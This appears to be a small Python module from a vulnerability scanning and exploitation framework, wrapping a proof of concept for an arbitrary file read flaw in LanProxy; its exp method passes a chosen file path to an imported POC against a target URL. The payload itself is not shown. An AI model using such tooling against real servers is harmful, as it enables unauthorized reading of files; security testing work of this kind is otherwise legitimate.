# -*- coding:utf-8 -*-
# LanProxy 任意文件读取
from ServiceScanModel.models import ServiceScan
from VulnScanModel.models import VulnScan
from . import lanproxy_file_poc
from ..requestClass import Requests
from .lanproxy_file_poc import POC


class EXP:
    def __init__(self, vuln: VulnScan):
        self.vuln = vuln
        self.requestUtil = Requests(vuln.cookies)

    def exp(self, cmd, content=""):
        poc = POC(ServiceScan(url=self.vuln.url, cookies=self.vuln.cookies))
        return poc.read_file(self.vuln.url, cmd)
